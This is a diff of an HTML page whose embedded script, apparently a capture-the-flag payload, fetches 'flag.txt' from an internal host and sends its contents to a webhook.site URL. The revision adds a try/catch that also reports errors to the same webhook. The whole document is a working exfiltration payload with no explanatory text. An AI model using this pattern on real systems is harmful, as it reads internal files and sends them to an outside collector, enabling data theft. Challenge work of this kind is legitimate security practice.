@@ -2,11 +2,15 @@
 <html>
 <body>
 <script>
-fetch("http://web-app/flag.txt")
-  .then(r => r.text())
-  .then(flag => {
-    fetch("https://webhook.site/851bcec7-becd-461e-b9f7-d9c21faab94d?flag=" + encodeURIComponent(flag));
-  });
+(async () => {
+  try {
+    const res = await fetch("http://web-app/flag.txt");
+    const text = await res.text();
+    fetch("https://webhook.site/851bcec7-becd-461e-b9f7-d9c21faab94d?success=1&flag=" + encodeURIComponent(text));
+  } catch (err) {
+    fetch("https://webhook.site/851bcec7-becd-461e-b9f7-d9c21faab94d?error=" + encodeURIComponent(err.toString()));
+  }
+})();
 </script>
 </body>
 </html>
